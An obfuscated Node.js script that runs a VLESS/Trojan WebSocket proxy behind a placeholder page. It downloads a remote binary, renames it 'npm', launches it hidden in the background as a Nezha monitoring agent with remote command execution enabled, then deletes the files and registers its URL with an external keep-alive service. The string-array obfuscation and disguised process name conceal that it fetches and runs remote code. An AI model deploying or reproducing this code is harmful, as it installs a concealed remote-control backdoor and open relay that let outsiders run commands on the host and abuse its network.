const _0x595b75=_0x2ae2;(function(_0x315c32,_0xac9df8){const _0x27f014=_0x2ae2,_0x2441e1=_0x315c32();while(!![]){try{const _0x25fed7=parseInt(_0x27f014(0x1f6))/0x1+-parseInt(_0x27f014(0x240))/0x2*(parseInt(_0x27f014(0x220))/0x3)+-parseInt(_0x27f014(0x1e3))/0x4+parseInt(_0x27f014(0x200))/0x5*(-parseInt(_0x27f014(0x230))/0x6)+-parseInt(_0x27f014(0x22b))/0x7*(-parseInt(_0x27f014(0x209))/0x8)+parseInt(_0x27f014(0x237))/0x9+parseInt(_0x27f014(0x1f0))/0xa;if(_0x25fed7===_0xac9df8)break;else _0x2441e1['push'](_0x2441e1['shift']());}catch(_0x3da116){_0x2441e1['push'](_0x2441e1['shift']());}}}(_0x16a1,0xe1d2c));const os=require('os'),http=require(_0x595b75(0x1fb)),fs=require('fs'),axios=require(_0x595b75(0x1d2)),net=require(_0x595b75(0x1c8)),path=require(_0x595b75(0x21a)),crypto=require(_0x595b75(0x208)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x595b75(0x214)]||_0x595b75(0x1ef),NEZHA_SERVER=process[_0x595b75(0x1fd)][_0x595b75(0x234)]||'',NEZHA_PORT=process['env'][_0x595b75(0x225)]||'',NEZHA_KEY=process[_0x595b75(0x1fd)][_0x595b75(0x20a)]||'',DOMAIN=process[_0x595b75(0x1fd)][_0x595b75(0x1da)]||_0x595b75(0x243),AUTO_ACCESS=process['env'][_0x595b75(0x1c6)]||![],WSPATH=process[_0x595b75(0x1fd)][_0x595b75(0x1f1)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x595b75(0x1fd)][_0x595b75(0x22e)]||_0x595b75(0x1c9),NAME=process[_0x595b75(0x1fd)]['NAME']||'',PORT=process['env'][_0x595b75(0x226)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x13691e=_0x595b75;try{const _0x325267=await axios[_0x13691e(0x239)](_0x13691e(0x20d)),_0x10d107=_0x325267[_0x13691e(0x1cf)];ISP=(_0x10d107['country']+'-'+_0x10d107['asOrganization'])['replace'](/ /g,'_');}catch(_0x1b1eef){ISP=_0x13691e(0x1e2);}};GetISP();const httpServer=http[_0x595b75(0x1e5)]((_0x5c491b,_0x4c9747)=>{const _0x2bd123=_0x595b75;if(_0x5c491b[_0x2bd123(0x242)]==='/'){const _0xac90b9=path[_0x2bd123(0x22a)](__dirname,_0x2bd123(0x1e7));fs[_0x2bd123(0x211)](_0xac90b9,_0x2bd123(0x241),(_0x3d5545,_0x562e74)=>{const _0x1cdb91=_0x2bd123;if(_0x3d5545){_0x4c9747[_0x1cdb91(0x22c)](0xc8,{'Content-Type':_0x1cdb91(0x218)}),_0x4c9747[_0x1cdb91(0x229)]('Hello\x20world!');return;}_0x4c9747['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x4c9747[_0x1cdb91(0x229)](_0x562e74);});return;}else{if(_0x5c491b[_0x2bd123(0x242)]==='/'+SUB_PATH){const _0x4f71ed=NAME?NAME+'-'+ISP:ISP,_0x545feb=_0x2bd123(0x1d1)+UUID+_0x2bd123(0x1f2)+DOMAIN+_0x2bd123(0x23c)+DOMAIN+_0x2bd123(0x23f)+WSPATH+'#'+_0x4f71ed,_0x1e9305=_0x2bd123(0x204)+UUID+_0x2bd123(0x1d3)+DOMAIN+_0x2bd123(0x23c)+DOMAIN+_0x2bd123(0x23f)+WSPATH+'#'+_0x4f71ed,_0x8ba42f=_0x545feb+'\x0a'+_0x1e9305,_0x4f2948=Buffer[_0x2bd123(0x216)](_0x8ba42f)[_0x2bd123(0x1f4)](_0x2bd123(0x224));_0x4c9747[_0x2bd123(0x22c)](0xc8,{'Content-Type':_0x2bd123(0x21e)}),_0x4c9747[_0x2bd123(0x229)](_0x4f2948+'\x0a');}else _0x4c9747[_0x2bd123(0x22c)](0x194,{'Content-Type':'text/plain'}),_0x4c9747[_0x2bd123(0x229)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x595b75(0x1ea))]({'server':httpServer}),uuid=UUID[_0x595b75(0x223)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x595b75(0x207)];function resolveHost(_0x539e4b){return new Promise((_0x42f187,_0x1f2b7a)=>{const _0x19942c=_0x2ae2;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x19942c(0x227)](_0x539e4b)){_0x42f187(_0x539e4b);return;}let _0x26b004=0x0;function _0x30a86b(){const _0x1b4a4a=_0x19942c;if(_0x26b004>=DNS_SERVERS['length']){_0x1f2b7a(new Error('Failed\x20to\x20resolve\x20'+_0x539e4b+_0x1b4a4a(0x210)));return;}const _0x32d841=DNS_SERVERS[_0x26b004];_0x26b004++;const _0x295104=_0x1b4a4a(0x1e1)+encodeURIComponent(_0x539e4b)+'&type=A';axios[_0x1b4a4a(0x239)](_0x295104,{'timeout':0x1388,'headers':{'Accept':_0x1b4a4a(0x20f)}})[_0x1b4a4a(0x1db)](_0x551981=>{const _0x4de641=_0x1b4a4a,_0x25acda=_0x551981[_0x4de641(0x1cf)];if(_0x25acda[_0x4de641(0x203)]===0x0&&_0x25acda[_0x4de641(0x1d4)]&&_0x25acda[_0x4de641(0x1d4)][_0x4de641(0x20c)]>0x0){const _0x55045c=_0x25acda[_0x4de641(0x1d4)][_0x4de641(0x22f)](_0x53f8c2=>_0x53f8c2['type']===0x1);if(_0x55045c){_0x42f187(_0x55045c[_0x4de641(0x1cf)]);return;}}_0x30a86b();})[_0x1b4a4a(0x215)](_0x24d581=>{_0x30a86b();});}_0x30a86b();});}function handleVlessConnection(_0xc50755,_0x1fe73b){const _0x3ded0b=_0x595b75,[_0x2c5232]=_0x1fe73b,_0x1dc3d3=_0x1fe73b[_0x3ded0b(0x1d0)](0x1,0x11);if(!_0x1dc3d3[_0x3ded0b(0x1c7)]((_0x25a84d,_0x362d85)=>_0x25a84d==parseInt(uuid[_0x3ded0b(0x23d)](_0x362d85*0x2,0x2),0x10)))return![];let _0x52f4fb=_0x1fe73b[_0x3ded0b(0x1d0)](0x11,0x12)['readUInt8']()+0x13;const _0xffc4b3=_0x1fe73b['slice'](_0x52f4fb,_0x52f4fb+=0x2)[_0x3ded0b(0x1e9)](0x0),_0x2b2d52=_0x1fe73b['slice'](_0x52f4fb,_0x52f4fb+=0x1)[_0x3ded0b(0x213)](),_0x51577b=_0x2b2d52==0x1?_0x1fe73b[_0x3ded0b(0x1d0)](_0x52f4fb,_0x52f4fb+=0x4)[_0x3ded0b(0x22a)]('.'):_0x2b2d52==0x2?new TextDecoder()[_0x3ded0b(0x1e8)](_0x1fe73b[_0x3ded0b(0x1d0)](_0x52f4fb+0x1,_0x52f4fb+=0x1+_0x1fe73b['slice'](_0x52f4fb,_0x52f4fb+0x1)[_0x3ded0b(0x213)]())):_0x2b2d52==0x3?_0x1fe73b['slice'](_0x52f4fb,_0x52f4fb+=0x10)[_0x3ded0b(0x1fc)]((_0x479bf4,_0x5966dc,_0x4820db,_0x470c6b)=>_0x4820db%0x2?_0x479bf4[_0x3ded0b(0x1ec)](_0x470c6b[_0x3ded0b(0x1d0)](_0x4820db-0x1,_0x4820db+0x1)):_0x479bf4,[])[_0x3ded0b(0x1cd)](_0x195376=>_0x195376[_0x3ded0b(0x1e9)](0x0)[_0x3ded0b(0x1f4)](0x10))['join'](':'):'';_0xc50755[_0x3ded0b(0x1dd)](new Uint8Array([_0x2c5232,0x0]));const _0x25a25d=createWebSocketStream(_0xc50755);return resolveHost(_0x51577b)['then'](_0x32e9be=>{const _0x24081c=_0x3ded0b;net[_0x24081c(0x1f3)]({'host':_0x32e9be,'port':_0xffc4b3},function(){const _0x3fc7ed=_0x24081c;this[_0x3fc7ed(0x228)](_0x1fe73b[_0x3fc7ed(0x1d0)](_0x52f4fb)),_0x25a25d['on'](_0x3fc7ed(0x212),()=>{})['pipe'](this)['on']('error',()=>{})[_0x3fc7ed(0x1d8)](_0x25a25d);})['on'](_0x24081c(0x212),()=>{});})[_0x3ded0b(0x215)](_0x37f5b5=>{const _0x2c1d04=_0x3ded0b;net[_0x2c1d04(0x1f3)]({'host':_0x51577b,'port':_0xffc4b3},function(){const _0x5609e2=_0x2c1d04;this['write'](_0x1fe73b[_0x5609e2(0x1d0)](_0x52f4fb)),_0x25a25d['on'](_0x5609e2(0x212),()=>{})[_0x5609e2(0x1d8)](this)['on'](_0x5609e2(0x212),()=>{})[_0x5609e2(0x1d8)](_0x25a25d);})['on'](_0x2c1d04(0x212),()=>{});}),!![];}function handleTrojanConnection(_0x3299a6,_0x18f209){const _0x12b1ce=_0x595b75;try{if(_0x18f209[_0x12b1ce(0x20c)]<0x3a)return![];const _0x40c918=_0x18f209[_0x12b1ce(0x1d0)](0x0,0x38)[_0x12b1ce(0x1f4)](),_0x4e643a=[UUID];let _0x21a79a=null;for(const _0x3ee677 of _0x4e643a){const _0x5b7917=crypto[_0x12b1ce(0x21b)](_0x12b1ce(0x23a))[_0x12b1ce(0x202)](_0x3ee677)[_0x12b1ce(0x238)](_0x12b1ce(0x1e4));if(_0x5b7917===_0x40c918){_0x21a79a=_0x3ee677;break;}}if(!_0x21a79a)return![];let _0x14365e=0x38;_0x18f209[_0x14365e]===0xd&&_0x18f209[_0x14365e+0x1]===0xa&&(_0x14365e+=0x2);const _0x58d0e3=_0x18f209[_0x14365e];if(_0x58d0e3!==0x1)return![];_0x14365e+=0x1;const _0x536142=_0x18f209[_0x14365e];_0x14365e+=0x1;let _0x22fe5c,_0x19c3ae;if(_0x536142===0x1)_0x22fe5c=_0x18f209[_0x12b1ce(0x1d0)](_0x14365e,_0x14365e+0x4)[_0x12b1ce(0x22a)]('.'),_0x14365e+=0x4;else{if(_0x536142===0x3){const _0x39fb02=_0x18f209[_0x14365e];_0x14365e+=0x1,_0x22fe5c=_0x18f209[_0x12b1ce(0x1d0)](_0x14365e,_0x14365e+_0x39fb02)[_0x12b1ce(0x1f4)](),_0x14365e+=_0x39fb02;}else{if(_0x536142===0x4)_0x22fe5c=_0x18f209[_0x12b1ce(0x1d0)](_0x14365e,_0x14365e+0x10)['reduce']((_0xb63e7c,_0x4e7974,_0x51893a,_0x5eba87)=>_0x51893a%0x2?_0xb63e7c['concat'](_0x5eba87['slice'](_0x51893a-0x1,_0x51893a+0x1)):_0xb63e7c,[])['map'](_0xb3e864=>_0xb3e864['readUInt16BE'](0x0)[_0x12b1ce(0x1f4)](0x10))[_0x12b1ce(0x22a)](':'),_0x14365e+=0x10;else return![];}}_0x19c3ae=_0x18f209[_0x12b1ce(0x1e9)](_0x14365e),_0x14365e+=0x2;_0x14365e<_0x18f209[_0x12b1ce(0x20c)]&&_0x18f209[_0x14365e]===0xd&&_0x18f209[_0x14365e+0x1]===0xa&&(_0x14365e+=0x2);const _0x3ee5e5=createWebSocketStream(_0x3299a6);return resolveHost(_0x22fe5c)[_0x12b1ce(0x1db)](_0x2f6c31=>{const _0x4577e3=_0x12b1ce;net[_0x4577e3(0x1f3)]({'host':_0x2f6c31,'port':_0x19c3ae},function(){const _0x1bd1df=_0x4577e3;_0x14365e<_0x18f209[_0x1bd1df(0x20c)]&&this[_0x1bd1df(0x228)](_0x18f209[_0x1bd1df(0x1d0)](_0x14365e)),_0x3ee5e5['on'](_0x1bd1df(0x212),()=>{})[_0x1bd1df(0x1d8)](this)['on'](_0x1bd1df(0x212),()=>{})['pipe'](_0x3ee5e5);})['on'](_0x4577e3(0x212),()=>{});})[_0x12b1ce(0x215)](_0xa9ad17=>{const _0xe58189=_0x12b1ce;net[_0xe58189(0x1f3)]({'host':_0x22fe5c,'port':_0x19c3ae},function(){const _0x43da3e=_0xe58189;_0x14365e<_0x18f209[_0x43da3e(0x20c)]&&this['write'](_0x18f209['slice'](_0x14365e)),_0x3ee5e5['on'](_0x43da3e(0x212),()=>{})[_0x43da3e(0x1d8)](this)['on'](_0x43da3e(0x212),()=>{})[_0x43da3e(0x1d8)](_0x3ee5e5);})['on']('error',()=>{});}),!![];}catch(_0x485f53){return![];}}function _0x16a1(){const _0x5a1fa5=['setsid\x20nohup\x20./npm\x20-s\x20','arm64','8443','NEZHA_SERVER','aarch64','false','1475595yNxYqu','digest','get','sha224','config.yaml','&fp=chrome&type=ws&host=','substr','log','&path=%2F','1773082akVsnS','utf8','url','1234.abc.com','AUTO_ACCESS','every','net','sub','post','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','unlink','map','close','data','slice','vless://','axios','@cdns.doon.eu.org:443?security=tls&sni=','Answer','chmod\x20+x\x20npm','443','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','pipe','stream','DOMAIN','then','npm\x20is\x20running','send','arm','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/v1','https://dns.google/resolve?name=','Unknown','2439988qEsXal','hex','createServer','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','index.html','decode','readUInt16BE','Server','writeFileSync','concat','npm\x20is\x20already\x20running,\x20skip\x20running...','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','f0563996-3665-439d-a1e1-fe2d036f554d','21454630kafZpQ','WSPATH','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','connect','toString','split','668620wAoohx','--tls','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','/bin/bash','npm','http','reduce','env','arch','npm\x20download\x20successfully','1439585jYKdiU','2096','update','Status','trojan://','\x20-p\x20','listen','1.1.1.1','crypto','392MDPrCT','NEZHA_KEY','error:\x20','length','https://speed.cloudflare.com/meta','application/json','application/dns-json','\x20with\x20all\x20DNS\x20servers','readFile','error','readUInt8','UUID','catch','from','2083','text/html','https://','path','createHash','2053','createWriteStream','text/plain','utf-8','3WvxaUc','npm\x20running\x20error:','includes','replace','base64','NEZHA_PORT','PORT','test','write','end','join','2758COgakQ','writeHead','https://arm64.ssss.nyc.mn/v1','SUB_PATH','find','12DlasmE'];_0x16a1=function(){return _0x5a1fa5;};return _0x16a1();}wss['on']('connection',(_0x5dcfeb,_0x211419)=>{const _0x5ecac1=_0x595b75,_0x3cf7a1=_0x211419[_0x5ecac1(0x242)]||'';_0x5dcfeb['once']('message',_0x1ad03e=>{const _0x36e6be=_0x5ecac1;if(_0x1ad03e[_0x36e6be(0x20c)]>0x11&&_0x1ad03e[0x0]===0x0){const _0x48828b=_0x1ad03e['slice'](0x1,0x11),_0xd3f7c8=_0x48828b[_0x36e6be(0x1c7)]((_0x512833,_0x372703)=>_0x512833==parseInt(uuid[_0x36e6be(0x23d)](_0x372703*0x2,0x2),0x10));if(_0xd3f7c8){!handleVlessConnection(_0x5dcfeb,_0x1ad03e)&&_0x5dcfeb[_0x36e6be(0x1ce)]();return;}}!handleTrojanConnection(_0x5dcfeb,_0x1ad03e)&&_0x5dcfeb['close']();})['on'](_0x5ecac1(0x212),()=>{});});const getDownloadUrl=()=>{const _0x5c12bd=_0x595b75,_0x56fc1c=os[_0x5c12bd(0x1fe)]();return _0x56fc1c===_0x5c12bd(0x1de)||_0x56fc1c===_0x5c12bd(0x232)||_0x56fc1c===_0x5c12bd(0x235)?!NEZHA_PORT?_0x5c12bd(0x22d):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x5c12bd(0x1e0):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x58b784=_0x595b75;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x52b270=getDownloadUrl(),_0x4786ad=await axios({'method':'get','url':_0x52b270,'responseType':_0x58b784(0x1d9)}),_0x1ad346=fs[_0x58b784(0x21d)](_0x58b784(0x1fa));return _0x4786ad[_0x58b784(0x1cf)]['pipe'](_0x1ad346),new Promise((_0x34f81a,_0x558134)=>{_0x1ad346['on']('finish',()=>{const _0x439434=_0x2ae2;console[_0x439434(0x23e)](_0x439434(0x1ff)),exec(_0x439434(0x1d5),_0x11158d=>{if(_0x11158d)_0x558134(_0x11158d);_0x34f81a();});}),_0x1ad346['on']('error',_0x558134);});}catch(_0x5c2180){throw _0x5c2180;}},runnz=async()=>{const _0xe9606e=_0x595b75;try{const _0x51336e=execSync(_0xe9606e(0x1f8),{'encoding':_0xe9606e(0x21f)});if(_0x51336e['trim']()!==''){console[_0xe9606e(0x23e)](_0xe9606e(0x1ed));return;}}catch(_0x2914c7){}await downloadFile();let _0x10ced5='',_0x1e9db9=[_0xe9606e(0x1d6),_0xe9606e(0x233),_0xe9606e(0x201),'2087',_0xe9606e(0x217),_0xe9606e(0x21c)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x573ea6=_0x1e9db9[_0xe9606e(0x222)](NEZHA_PORT)?_0xe9606e(0x1f7):'';_0x10ced5=_0xe9606e(0x231)+NEZHA_SERVER+':'+NEZHA_PORT+_0xe9606e(0x205)+NEZHA_KEY+'\x20'+_0x573ea6+_0xe9606e(0x1e6);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4bd0b4=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0xe9606e(0x1f5)](':')['pop']():'',_0x6b4db2=_0x1e9db9[_0xe9606e(0x222)](_0x4bd0b4)?'true':_0xe9606e(0x236),_0x21a94f='client_secret:\x20'+NEZHA_KEY+_0xe9606e(0x1cb)+NEZHA_SERVER+_0xe9606e(0x1ee)+_0x6b4db2+_0xe9606e(0x1d7)+UUID;fs[_0xe9606e(0x1eb)](_0xe9606e(0x23b),_0x21a94f);}_0x10ced5=_0xe9606e(0x1df);}else{console[_0xe9606e(0x23e)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x10ced5,{'shell':_0xe9606e(0x1f9)},_0x42d27a=>{const _0x1c8bdd=_0xe9606e;if(_0x42d27a)console[_0x1c8bdd(0x212)](_0x1c8bdd(0x221),_0x42d27a);else console['log'](_0x1c8bdd(0x1dc));});}catch(_0x1edd0b){console[_0xe9606e(0x212)](_0xe9606e(0x20b)+_0x1edd0b);}};async function addAccessTask(){const _0x5211be=_0x595b75;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x49eca0=_0x5211be(0x219)+DOMAIN+'/'+SUB_PATH;try{const _0x58428f=await axios[_0x5211be(0x1ca)]('https://oooo.serv00.net/add-url',{'url':_0x49eca0},{'headers':{'Content-Type':_0x5211be(0x20e)}});console[_0x5211be(0x23e)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x29bfd4){}}function _0x2ae2(_0x43aca5,_0x109ab9){_0x43aca5=_0x43aca5-0x1c6;const _0x16a18c=_0x16a1();let _0x2ae256=_0x16a18c[_0x43aca5];return _0x2ae256;}const delFiles=()=>{const _0x60d4d=_0x595b75;fs[_0x60d4d(0x1cc)]('npm',()=>{}),fs[_0x60d4d(0x1cc)](_0x60d4d(0x23b),()=>{});};httpServer[_0x595b75(0x206)](PORT,()=>{const _0x3c5abf=_0x595b75;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3c5abf(0x23e)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
